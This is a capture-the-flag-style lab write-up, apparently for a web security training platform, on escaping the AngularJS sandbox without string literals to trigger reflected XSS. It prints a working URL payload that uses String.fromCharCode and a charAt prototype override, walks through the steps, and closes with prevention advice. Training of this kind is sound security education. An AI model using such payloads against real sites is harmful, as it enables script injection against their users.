# Lab 26: Reflected XSS with AngularJS sandbox escape without strings

**Goal**: Escape the AngularJS sandbox without using string literals or `$eval` to execute `alert(1)`.

This lab uses AngularJS in an environment where `$eval` is disabled and string literals (`'...'` or `"..."`) cannot be used inside AngularJS expressions. To solve the lab, we must construct an AngularJS sandbox escape payload that dynamically generates string characters using `String.fromCharCode()` and overrides prototype methods (`toString().constructor.prototype.charAt`).

---

## 🎯 Solution

1. Construct the stringless AngularJS sandbox escape URL payload:
   ```http
   /?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
   ```
2. Append the payload to the lab URL and press Enter.
3. Observe `alert(1)` execute instantly without using string literals or `$eval`.

![Lab 26 Stringless Sandbox Escape Payload](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926223742.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze AngularJS Sandbox Restrictions
Attempting standard string expressions like `{{'alert(1)'}}` fails because string literals are blocked or stripped by the application filter. Furthermore, `$eval()` is unavailable.

### Step 2: Construct Stringless Expression Payload
We can generate the character string `x=alert(1)` without string literals by calling `String.fromCharCode()` with character code array values:

```javascript
String.fromCharCode(120,61,97,108,101,114,116,40,49,41) // Returns "x=alert(1)"
```

### Step 3: Override `charAt` Prototype & Execute
To force AngularJS `orderBy` filter to parse and evaluate the generated string as JavaScript code, we override `String.prototype.charAt` using `Array.prototype.join`:

```javascript
toString().constructor.prototype.charAt=[].join;
```

Combining the prototype override with the `orderBy` filter character generation yields the final payload:

```http
/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

### Step 4: Verify Payload Execution
Load the target URL in the browser:

```http
https://<YOUR-LAB-ID>.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

AngularJS compiles the expression and executes `alert(1)`:

![Lab 26 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926223833.png)

> [!SUCCESS]
> **Lab Solved**: Successfully escaped the AngularJS sandbox without using string literals or `$eval()`!

---

## 💡 Key Takeaways: Stringless Expression Injection

- **String Construction via Character Codes**: `String.fromCharCode()` converts integer ASCII values into characters dynamically, bypassing string literal detection (`'`, `"`).
- **Prototype Mutation in Templates**: Overriding built-in object prototype methods (like `charAt` or `toString`) alters how template compilers parse expressions, triggering arbitrary code execution.

---

## 🔒 Prevention

> [!TIP]
> 1. **Do Not Reflect Raw User Input in Templates**: Avoid embedding user input directly into HTML nodes compiled by AngularJS (`ng-app`).
> 2. **Freeze Object Prototypes**: Use `Object.freeze(Object.prototype)` and `Object.freeze(String.prototype)` to prevent client-side prototype pollution and method overrides.
